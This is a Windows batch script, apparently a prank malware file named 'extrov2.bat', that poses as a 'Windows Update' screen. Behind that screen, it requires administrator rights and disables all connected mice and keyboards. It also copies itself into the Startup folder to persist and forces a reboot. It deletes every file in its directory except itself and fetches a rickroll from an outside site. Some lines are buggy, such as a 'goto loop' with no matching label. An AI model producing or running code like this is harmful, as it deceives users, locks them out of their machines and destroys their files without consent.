@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :main
) else (
    echo Please run this file as administrator.
    pause
    exit
)
:main
for /f "tokens=*" %%a in ('pnputil /enum-devices /connected ^| findstr /i "mouse"') do (
    for /f "tokens=2 delims=:" %%b in ("%%a") do (
        set "device_id=%%b"
        pnputil /disable-device "%device_id%"
    )
)
for /f "tokens=*" %%a in ('pnputil /enum-devices /connected ^| findstr /i "keyboard"') do (
    for /f "tokens=2 delims=:" %%b in ("%%a") do (
        set "device_id=%%b"
        pnputil /disable-device "%device_id%"
    )
)
start /max "extrov2.bat"
color 0a
mode 1000
title Windows Update
echo Please wait while we install the latest updates for your system... expected time: 1 minute and 40 seconds
timeout /t 100 >nul
echo Installing updates...
timeout /t 10 >nul
echo reloading system files...
copy "extrov2.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
timeout /t 10 >nul
echo Update complete! Restarting your computer...
shutdown /r /f /t 0
START "" "cmd.exe" /k "echo Your pc has been fried by extro"

for /f "delims=" %%i in ('dir /b /a-d') do (
    if not "%%i"=="extrov2.bat" and not "%%i"=="cmd.exe" (
        del "%%i"
    )
)
curl ASCII.live/rick
goto loop
